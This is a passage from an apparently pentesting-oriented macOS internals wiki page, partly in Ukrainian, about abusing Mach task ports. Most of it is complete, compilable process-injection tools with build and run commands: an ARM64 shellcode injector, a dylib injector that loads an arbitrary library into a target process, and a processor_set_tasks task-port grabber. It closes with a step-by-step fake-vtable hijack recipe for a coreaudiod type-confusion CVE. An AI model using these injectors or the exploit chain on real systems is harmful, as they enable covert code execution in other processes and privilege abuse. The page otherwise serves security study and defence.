mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Щоб це працювало на iOS, потрібен entitlement `dynamic-codesigning`, щоб мати можливість зробити пам'ять, доступну для запису, виконуваною.

### Dylib Injection in thread via Task port

У macOS **threads** можуть маніпулюватися через **Mach** або за допомогою **posix `pthread` api**. Потік, який ми створили під час попередньої ін'єкції, було створено за допомогою Mach api, тому **він не є posix-сумісним**.

Було можливо **ін'єктувати простий shellcode** для виконання команди, оскільки йому **не потрібно було працювати з posix-сумісними api**, а лише з Mach. **Складніші ін'єкції** потребували б, щоб **потік** також був **posix-сумісним**.

Тому, щоб **покращити потік**, він має викликати **`pthread_create_from_mach_thread`**, яка **створить валідний pthread**. Після цього новий pthread зможе **викликати dlopen**, щоб **завантажити dylib** із системи. Таким чином, замість написання нового shellcode для виконання різних дій можна завантажувати власні бібліотеки.<sup>[2]</sup>

Ви можете знайти **приклади dylib** тут (наприклад, одну, яка генерує log, після чого його можна прослуховувати):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

У цій техніці виконується hijacking потоку процесу:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Виявлення Task Port Injection

Під час виклику `task_for_pid` або `thread_create_*` у структурі task з kernel збільшується лічильник, до якого можна отримати доступ із user mode, викликавши `task_info(task, TASK_EXTMOD_INFO, ...)`

## Порти винятків

Коли у потоці виникає виняток, цей виняток надсилається на призначений exception port потоку. Якщо потік не обробляє його, він надсилається на exception ports task. Якщо task не обробляє його, він надсилається на host port, яким керує launchd (де він буде підтверджений). Це називається exception triage.

Зазвичай наприкінці, якщо звіт не оброблено належним чином, він потрапляє до daemon ReportCrash. Однак інший потік у тому самому task може обробити виняток — саме це роблять інструменти crash reporting, такі як `PLCreashReporter`.

## Інші об'єкти

### Clock

Будь-який користувач може отримувати інформацію про clock, однак для встановлення часу або зміни інших налаштувань потрібні права root.

Щоб отримати інформацію, можна викликати функції з підсистеми `clock`, наприклад: `clock_get_time`, `clock_get_attributtes` або `clock_alarm`\
Для зміни значень можна використати підсистему `clock_priv` із такими функціями, як `clock_set_time` і `clock_set_attributes`

### Processors and Processor Set

apis processor дозволяє керувати одним логічним процесором, викликаючи такі функції, як `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Крім того, apis **processor set** надає спосіб об'єднати кілька процесорів у групу. Отримати default processor set можна, викликавши **`processor_set_default`**.\
Ось кілька цікавих API для взаємодії з processor set:

- `processor_set_statistics`
- `processor_set_tasks`: Повертає масив send rights для всіх task у processor set
- `processor_set_threads`: Повертає масив send rights для всіх потоків у processor set
- `processor_set_stack_usage`
- `processor_set_info`

Як зазначено в [**цьому дописі**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), у минулому це дозволяло обійти згаданий раніше захист, щоб отримати task ports інших процесів і керувати ними, викликавши **`processor_set_tasks`** та отримавши host port для кожного процесу.\
Нині для використання цієї функції потрібен root, і вона захищена, тому отримати ці ports можна буде лише для незахищених процесів.<sup>[11]</sup>

Ви можете спробувати це за допомогою:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[10]</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)
- [7] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [8] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [9] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [10] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [11] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
